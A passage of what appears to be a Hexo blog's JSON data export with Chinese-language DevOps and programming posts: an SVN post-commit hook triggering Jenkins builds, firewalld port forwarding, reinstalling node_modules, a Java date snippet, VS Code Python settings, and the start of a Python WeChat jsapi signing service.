output</code>多半是没有赋予<code>post-commit</code>可执行权限，还有可能下边的原因。我之前没有复制<code>post-commit.tmpl</code>而是选择手动新建了<code>post-commit</code>文件，就一直报错，百撕不得骑姐，后来复制<code>post-commit.tmpl</code>就没问题了。</p>\n</li>\n<li><p>添加<code>source /etc/profile</code>的目的是为了确保jdk环境正常。</p>\n</li>\n</ul>\n<h3 id=\"2-配置命令自动部署\"><a href=\"#2-配置命令自动部署\" class=\"headerlink\" title=\"2.配置命令自动部署\"></a>2.配置命令自动部署</h3><p>修改<code>post-commit</code>文件为</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> /etc/profile</span><br><span class=\"line\">java -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog</span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0</span><br></pre></td></tr></table></figure>\n<p>这样配置只要提交代码就会操作<code>jenkins</code>部署。如果需要指定用户提交代码才部署则可以如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">REPOS=<span class=\"string\">\"<span class=\"variable\">$1</span>\"</span></span><br><span class=\"line\">REV=<span class=\"string\">\"<span class=\"variable\">$2</span>\"</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> /etc/profile</span><br><span class=\"line\">AUTHOR=$(svnlook author -r <span class=\"variable\">$REV</span> <span class=\"variable\">$REPOS</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$AUTHOR</span> == admin ];<span class=\"keyword\">then</span></span><br><span class=\"line\">    java -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、jenkins相关\"><a href=\"#一、jenkins相关\" class=\"headerlink\" title=\"一、jenkins相关\"></a>一、jenkins相关</h2><h3 id=\"1-创建SVN专用账号\"><a href=\"#1-创建SVN专用账号\" class=\"headerlink\" title=\"1.创建SVN专用账号\"></a>1.创建SVN专用账号</h3><p>进入<code>jenkins</code>管理后台，<code>系统管理</code>-<code>管理用户</code>-左边的<code>新建用户</code>，输入相关信息后点击<code>新建用户</code>，假设你创建的账号密码分别是<code>svn</code>，<code>svnpwd</code>。</p>","more":"<ul>\n<li>此步骤可以省略，给<code>SVN</code>创建专用账户的好处是可以知道该条部署是由<code>SVN</code>自动部署，还是某人手工部署。</li>\n</ul>\n<h3 id=\"2-命令部署SVN\"><a href=\"#2-命令部署SVN\" class=\"headerlink\" title=\"2.命令部署SVN\"></a>2.命令部署SVN</h3><p>进入<code>jenkins</code>管理后台，<code>系统管理</code>-<code>Jenkins 命令行接口</code>，在页面第一行点击下载<code>jenkins-cli.jar</code>，并复制到SVN所在服务器的某个目录，例如<code>/home/svn/jenkins-cli.jar</code>，在此之前你的服务器应当已经安装了jdk环境。假设你的<code>jenkins</code>运行在<code>http://127.0.0.1:8080</code>，将要部署的项目名为<code>blog</code>，通过以下命令测试是否可以完成部署。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog</span><br></pre></td></tr></table></figure>\n<ul>\n<li>注意，此命令需要<code>jenkins</code>使用<code>webSocket</code>，如果你使用不完整的反向代理配置可能导致该方法不可用。</li>\n</ul>\n<h2 id=\"二、SVN相关\"><a href=\"#二、SVN相关\" class=\"headerlink\" title=\"二、SVN相关\"></a>二、SVN相关</h2><h3 id=\"1-使用post-commit\"><a href=\"#1-使用post-commit\" class=\"headerlink\" title=\"1.使用post-commit\"></a>1.使用post-commit</h3><p>进入你的<code>SVN</code>项目目录，例如<code>/home/svn/project</code>，可以看到hooks文件夹，进入该文件夹，复制<code>post-commit.tmpl</code>到当前目录命名为<code>post-commit</code>，并赋予其执行权限</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod +x post-commit</span><br></pre></td></tr></table></figure>\n<p>清空里边的内容并编辑如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">REPOS=<span class=\"string\">\"<span class=\"variable\">$1</span>\"</span></span><br><span class=\"line\">REV=<span class=\"string\">\"<span class=\"variable\">$2</span>\"</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> /etc/profile</span><br><span class=\"line\">AUTHOR=$(svnlook author -r <span class=\"variable\">$REV</span> <span class=\"variable\">$REPOS</span>)</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$AUTHOR</span> &gt;&gt; /home/svn/project/hooks/user.txt</span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0</span><br></pre></td></tr></table></figure>\n<p>测试提交代码，如果可以看到提交代码的用户名已经打印到<code>/home/svn/project/hooks/user.txt</code>文件中，则说明成功。</p>\n<ul>\n<li><p>提示<code>post-commit hook failed (exit code 255) with no output</code>多半是没有赋予<code>post-commit</code>可执行权限，还有可能下边的原因。我之前没有复制<code>post-commit.tmpl</code>而是选择手动新建了<code>post-commit</code>文件，就一直报错，百撕不得骑姐，后来复制<code>post-commit.tmpl</code>就没问题了。</p>\n</li>\n<li><p>添加<code>source /etc/profile</code>的目的是为了确保jdk环境正常。</p>\n</li>\n</ul>\n<h3 id=\"2-配置命令自动部署\"><a href=\"#2-配置命令自动部署\" class=\"headerlink\" title=\"2.配置命令自动部署\"></a>2.配置命令自动部署</h3><p>修改<code>post-commit</code>文件为</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> /etc/profile</span><br><span class=\"line\">java -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog</span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0</span><br></pre></td></tr></table></figure>\n<p>这样配置只要提交代码就会操作<code>jenkins</code>部署。如果需要指定用户提交代码才部署则可以如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">REPOS=<span class=\"string\">\"<span class=\"variable\">$1</span>\"</span></span><br><span class=\"line\">REV=<span class=\"string\">\"<span class=\"variable\">$2</span>\"</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> /etc/profile</span><br><span class=\"line\">AUTHOR=$(svnlook author -r <span class=\"variable\">$REV</span> <span class=\"variable\">$REPOS</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$AUTHOR</span> == admin ];<span class=\"keyword\">then</span></span><br><span class=\"line\">    java -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0</span><br></pre></td></tr></table></figure>"},{"title":"基于firewalld端口转发","date":"2021-02-08T07:07:53.000Z","_content":"\n## 1.首先确认firewalld已经安装\n\n```shell\nfirewall-cmd --state\n```\n\n如果输出不**是running**，则可能没安装或者没启动，没启动会提示`not running`\n\n<!--more-->\n\n* 没安装，通过`yum install -y firewalld`安装\n\n* 安装后，或没启动，通过以下命令配置开机自动启动并立即启动\n\n  ```shell\n  systemctl enable firewalld\n  systemctl start firewalld\n  ```\n\n  \n\n## 2.配置转发\n\n* 本实例假设你要把本地8080端口转发到目标服务器88.88.88.88的443端口，同时转发TCP和UDP\n\n```shell\necho 'net.ipv4.ip_forward = 1' >> /etc/sysctl.conf\nsysctl -p\nfirewall-cmd --permanent --add-masquerade\n# 8080可以改成其他端口\nfirewall-cmd --permanent --add-port=8080/tcp\nfirewall-cmd --permanent --add-port=8080/udp\n# 8080和上面保持一致，目标ip和端口都可以修改\nfirewall-cmd --permanent --add-forward-port=port=8080:proto=tcp:toaddr=88.88.88.88:toport=443\nfirewall-cmd --permanent --add-forward-port=port=8080:proto=udp:toaddr=88.88.88.88:toport=443\nfirewall-cmd --reload\n```","source":"_posts/newpost-10.md","raw":"---\ntitle: 基于firewalld端口转发\ndate: 2021-02-08 15:07:53\ntags: 运维\n---\n\n## 1.首先确认firewalld已经安装\n\n```shell\nfirewall-cmd --state\n```\n\n如果输出不**是running**，则可能没安装或者没启动，没启动会提示`not running`\n\n<!--more-->\n\n* 没安装，通过`yum install -y firewalld`安装\n\n* 安装后，或没启动，通过以下命令配置开机自动启动并立即启动\n\n  ```shell\n  systemctl enable firewalld\n  systemctl start firewalld\n  ```\n\n  \n\n## 2.配置转发\n\n* 本实例假设你要把本地8080端口转发到目标服务器88.88.88.88的443端口，同时转发TCP和UDP\n\n```shell\necho 'net.ipv4.ip_forward = 1' >> /etc/sysctl.conf\nsysctl -p\nfirewall-cmd --permanent --add-masquerade\n# 8080可以改成其他端口\nfirewall-cmd --permanent --add-port=8080/tcp\nfirewall-cmd --permanent --add-port=8080/udp\n# 8080和上面保持一致，目标ip和端口都可以修改\nfirewall-cmd --permanent --add-forward-port=port=8080:proto=tcp:toaddr=88.88.88.88:toport=443\nfirewall-cmd --permanent --add-forward-port=port=8080:proto=udp:toaddr=88.88.88.88:toport=443\nfirewall-cmd --reload\n```","slug":"newpost-10","published":1,"updated":"2021-02-08T07:18:25.243Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rcm0002q0szxu11k314","content":"<h2 id=\"1-首先确认firewalld已经安装\"><a href=\"#1-首先确认firewalld已经安装\" class=\"headerlink\" title=\"1.首先确认firewalld已经安装\"></a>1.首先确认firewalld已经安装</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">firewall-cmd --state</span><br></pre></td></tr></table></figure>\n<p>如果输出不<strong>是running</strong>，则可能没安装或者没启动，没启动会提示<code>not running</code></p>\n<a id=\"more\"></a>\n<ul>\n<li><p>没安装，通过<code>yum install -y firewalld</code>安装</p>\n</li>\n<li><p>安装后，或没启动，通过以下命令配置开机自动启动并立即启动</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl enable firewalld</span><br><span class=\"line\">systemctl start firewalld</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"2-配置转发\"><a href=\"#2-配置转发\" class=\"headerlink\" title=\"2.配置转发\"></a>2.配置转发</h2><ul>\n<li>本实例假设你要把本地8080端口转发到目标服务器88.88.88.88的443端口，同时转发TCP和UDP</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 'net.ipv4.ip_forward = 1' &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\">sysctl -p</span><br><span class=\"line\">firewall-cmd --permanent --add-masquerade</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 8080可以改成其他端口</span></span><br><span class=\"line\">firewall-cmd --permanent --add-port=8080/tcp</span><br><span class=\"line\">firewall-cmd --permanent --add-port=8080/udp</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 8080和上面保持一致，目标ip和端口都可以修改</span></span><br><span class=\"line\">firewall-cmd --permanent --add-forward-port=port=8080:proto=tcp:toaddr=88.88.88.88:toport=443</span><br><span class=\"line\">firewall-cmd --permanent --add-forward-port=port=8080:proto=udp:toaddr=88.88.88.88:toport=443</span><br><span class=\"line\">firewall-cmd --reload</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h2 id=\"1-首先确认firewalld已经安装\"><a href=\"#1-首先确认firewalld已经安装\" class=\"headerlink\" title=\"1.首先确认firewalld已经安装\"></a>1.首先确认firewalld已经安装</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">firewall-cmd --state</span><br></pre></td></tr></table></figure>\n<p>如果输出不<strong>是running</strong>，则可能没安装或者没启动，没启动会提示<code>not running</code></p>","more":"<ul>\n<li><p>没安装，通过<code>yum install -y firewalld</code>安装</p>\n</li>\n<li><p>安装后，或没启动，通过以下命令配置开机自动启动并立即启动</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl enable firewalld</span><br><span class=\"line\">systemctl start firewalld</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"2-配置转发\"><a href=\"#2-配置转发\" class=\"headerlink\" title=\"2.配置转发\"></a>2.配置转发</h2><ul>\n<li>本实例假设你要把本地8080端口转发到目标服务器88.88.88.88的443端口，同时转发TCP和UDP</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 'net.ipv4.ip_forward = 1' &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\">sysctl -p</span><br><span class=\"line\">firewall-cmd --permanent --add-masquerade</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 8080可以改成其他端口</span></span><br><span class=\"line\">firewall-cmd --permanent --add-port=8080/tcp</span><br><span class=\"line\">firewall-cmd --permanent --add-port=8080/udp</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 8080和上面保持一致，目标ip和端口都可以修改</span></span><br><span class=\"line\">firewall-cmd --permanent --add-forward-port=port=8080:proto=tcp:toaddr=88.88.88.88:toport=443</span><br><span class=\"line\">firewall-cmd --permanent --add-forward-port=port=8080:proto=udp:toaddr=88.88.88.88:toport=443</span><br><span class=\"line\">firewall-cmd --reload</span><br></pre></td></tr></table></figure>"},{"title":"删除node_modules重新安装","date":"2021-03-18T06:48:05.000Z","_content":"\n* 1.关闭项目，终端中进入项目目录\n\n<!--more-->\n\n* 2.安装rimraf\n\n```bash\nnpm install -g rimraf\n```\n\n* 3.删除 node_modules 包和 package-lock.json 文件\n\n```sh\nrimraf node_modules\nrimraf package-lock.json\n```\n\n* 4.清除缓存\n\n```shell\nnpm cache clear --force\n```\n\n* 5.重新安装依赖包\n\n```shell\nnpm install\n```\n\n* 6启动项目\n\n### 另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决\n\n```shell\nnpm config set registry https://registry.npm.taobao.org\n```\n\n","source":"_posts/newpost-12.md","raw":"---\ntitle: 删除node_modules重新安装\ndate: 2021-03-18 14:48:05\ntags: [编程,前端]\n---\n\n* 1.关闭项目，终端中进入项目目录\n\n<!--more-->\n\n* 2.安装rimraf\n\n```bash\nnpm install -g rimraf\n```\n\n* 3.删除 node_modules 包和 package-lock.json 文件\n\n```sh\nrimraf node_modules\nrimraf package-lock.json\n```\n\n* 4.清除缓存\n\n```shell\nnpm cache clear --force\n```\n\n* 5.重新安装依赖包\n\n```shell\nnpm install\n```\n\n* 6启动项目\n\n### 另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决\n\n```shell\nnpm config set registry https://registry.npm.taobao.org\n```\n\n","slug":"newpost-12","published":1,"updated":"2021-03-18T06:55:35.142Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rcp0005q0sz5p3xmwlr","content":"<ul>\n<li>1.关闭项目，终端中进入项目目录</li>\n</ul>\n<a id=\"more\"></a>\n<ul>\n<li>2.安装rimraf</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g rimraf</span><br></pre></td></tr></table></figure>\n<ul>\n<li>3.删除 node_modules 包和 package-lock.json 文件</li>\n</ul>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rimraf node_modules</span><br><span class=\"line\">rimraf package-lock.json</span><br></pre></td></tr></table></figure>\n<ul>\n<li>4.清除缓存</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm cache clear --force</span><br></pre></td></tr></table></figure>\n<ul>\n<li>5.重新安装依赖包</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install</span><br></pre></td></tr></table></figure>\n<ul>\n<li>6启动项目</li>\n</ul>\n<h3 id=\"另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决\"><a href=\"#另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决\" class=\"headerlink\" title=\"另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决\"></a>另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<ul>\n<li>1.关闭项目，终端中进入项目目录</li>\n</ul>","more":"<ul>\n<li>2.安装rimraf</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g rimraf</span><br></pre></td></tr></table></figure>\n<ul>\n<li>3.删除 node_modules 包和 package-lock.json 文件</li>\n</ul>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rimraf node_modules</span><br><span class=\"line\">rimraf package-lock.json</span><br></pre></td></tr></table></figure>\n<ul>\n<li>4.清除缓存</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm cache clear --force</span><br></pre></td></tr></table></figure>\n<ul>\n<li>5.重新安装依赖包</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install</span><br></pre></td></tr></table></figure>\n<ul>\n<li>6启动项目</li>\n</ul>\n<h3 id=\"另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决\"><a href=\"#另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决\" class=\"headerlink\" title=\"另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决\"></a>另外，请不要在任何情况、任何项目中使用cnpm，可能导致各种意想不到甚至无法修复的问题，如果嫌npm慢，可以换淘宝源来解决</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>"},{"title":"LocalDate获取当前周周一日期","date":"2021-06-21T05:40:24.000Z","_content":"\n```java\nimport java.time.DayOfWeek;\nimport java.time.LocalDate;\nimport java.time.temporal.TemporalAdjusters;\n\nLocalDate today = LocalDate.now();\nLocalDate moday = today.with(TemporalAdjusters.previousOrSame(DayOfWeek.MONDAY));\n```\n\n","source":"_posts/newpost-13.md","raw":"---\ntitle: LocalDate获取当前周周一日期\ndate: 2021-06-21 13:40:24\ntags: [编程,Java]\n---\n\n```java\nimport java.time.DayOfWeek;\nimport java.time.LocalDate;\nimport java.time.temporal.TemporalAdjusters;\n\nLocalDate today = LocalDate.now();\nLocalDate moday = today.with(TemporalAdjusters.previousOrSame(DayOfWeek.MONDAY));\n```\n\n","slug":"newpost-13","published":1,"updated":"2021-06-21T05:43:28.291Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rcr0007q0szvaxcx5af","content":"<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.time.DayOfWeek;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.time.LocalDate;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.time.temporal.TemporalAdjusters;</span><br><span class=\"line\"></span><br><span class=\"line\">LocalDate today = LocalDate.now();</span><br><span class=\"line\">LocalDate moday = today.with(TemporalAdjusters.previousOrSame(DayOfWeek.MONDAY));</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.time.DayOfWeek;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.time.LocalDate;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.time.temporal.TemporalAdjusters;</span><br><span class=\"line\"></span><br><span class=\"line\">LocalDate today = LocalDate.now();</span><br><span class=\"line\">LocalDate moday = today.with(TemporalAdjusters.previousOrSame(DayOfWeek.MONDAY));</span><br></pre></td></tr></table></figure>\n"},{"title":"VsCode开发Python常用配置","date":"2021-06-24T08:06:11.000Z","_content":"\n```js\n{\n    \"python.linting.flake8Enabled\": true,\n    \"python.formatting.provider\": \"yapf\",\n    \"python.formatting.yapfArgs\": [\"--style={column_limit=128}\"],\n    \"python.linting.flake8Args\": [\"--max-line-length=248\"],\n    \"python.linting.pylintEnabled\": false\n}\n```\n\n<!--more-->\n\n以上采用yapf格式化代码，格式化后单行代码最大长度为128\n","source":"_posts/newpost-15.md","raw":"---\ntitle: VsCode开发Python常用配置\ndate: 2021-06-24 16:06:11\ntags: [编程,Python]\n---\n\n```js\n{\n    \"python.linting.flake8Enabled\": true,\n    \"python.formatting.provider\": \"yapf\",\n    \"python.formatting.yapfArgs\": [\"--style={column_limit=128}\"],\n    \"python.linting.flake8Args\": [\"--max-line-length=248\"],\n    \"python.linting.pylintEnabled\": false\n}\n```\n\n<!--more-->\n\n以上采用yapf格式化代码，格式化后单行代码最大长度为128\n","slug":"newpost-15","published":1,"updated":"2021-06-24T08:08:12.488Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rct0009q0szdw4nirzs","content":"<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"python.linting.flake8Enabled\"</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"string\">\"python.formatting.provider\"</span>: <span class=\"string\">\"yapf\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"python.formatting.yapfArgs\"</span>: [<span class=\"string\">\"--style=&#123;column_limit=128&#125;\"</span>],</span><br><span class=\"line\">    <span class=\"string\">\"python.linting.flake8Args\"</span>: [<span class=\"string\">\"--max-line-length=248\"</span>],</span><br><span class=\"line\">    <span class=\"string\">\"python.linting.pylintEnabled\"</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p>以上采用yapf格式化代码，格式化后单行代码最大长度为128</p>\n","site":{"data":{}},"excerpt":"<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"python.linting.flake8Enabled\"</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"string\">\"python.formatting.provider\"</span>: <span class=\"string\">\"yapf\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"python.formatting.yapfArgs\"</span>: [<span class=\"string\">\"--style=&#123;column_limit=128&#125;\"</span>],</span><br><span class=\"line\">    <span class=\"string\">\"python.linting.flake8Args\"</span>: [<span class=\"string\">\"--max-line-length=248\"</span>],</span><br><span class=\"line\">    <span class=\"string\">\"python.linting.pylintEnabled\"</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","more":"<p>以上采用yapf格式化代码，格式化后单行代码最大长度为128</p>"},{"title":"python实现微信jsapi签名","date":"2021-06-24T08:12:39.000Z","_content":"\n* 以下完整演示了获取access_token，获取ticket，最后签名返回前端全过程。\n\n<!--more-->\n\n* requirements.txt\n\n```\nrequests==2.23.0\nredis==3.5.3\ntornado==6.0.4\n```\n\n* 安装依赖\n\n```shell\npip install -r requirements.txt\n```\n\n* 调用，其中xxx改成当前前端页面地址，不要url编码\n\n```\nhttp://localhost:8060/getApi?url=xxx\n```\n\n* 程序，注意，程序没有对可能的错误做处理（因为几乎不会出错，如果出错，九成是因为ip白名单没有配置）\n\n```python\nimport redis\nimport requests\nimport json\nimport hashlib\nimport time\nimport random\nimport string\n\nfrom tornado.web import Application, RequestHandler\nfrom tornado.ioloop import IOLoop\n\n# 公众号id与秘钥\nappId = 'xxx'\nappSecret = 'xxx'\n\n# 缓存的access_token与ticket在redis中的key\nack = 'test_access_token'\ntik = 'test_ticket'\n\n# redis主机和密码\nredisHost = 'xxx'\nredisPassword = 'xxx'\n\nr = redis.Redis(host=redisHost, port=6379, password=redisPassword, decode_responses=True)\n\n\ndef getTicket():\n    if r.get(tik) is None:\n        if r.get(ack) is None:\n            params_ack = {'grant_type': 'client_credential', 'appid': appId, 'secret': appSecret}\n            access_token_data = requests.get('https://api.weixin.qq.com/cgi-bin/token', params=params_ack).text\n            access_token = json.loads(access_token_data)['access_token']\n            r.set(ack, access_token, ex=7100)\n        else:\n            access_token = r.get(ack)\n        params_tik = {'access_token': access_token, 'type': 'jsapi'}\n        ticket_data = requests.get('https://api.weixin.qq.com/cgi-bin/ticket/getticket', params_tik).text\n        ticket = json.loads(ticket_data)['ticket']\n        r.set(tik, ticket, ex=7100)\n    else:\n        ticket = r.get(tik)\n    return ticket\n\n\ndef getSignature(url):\n    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))\n    timestamp = int(time.time())\n    params = {'noncestr': ran_str, 'jsapi_ticket': getTicket(), 'timestamp': timestamp, 'url': url}\n    stringA = ''\n    # 参数排序与拼接\n    ks = sorted(params.keys())\n    for k in 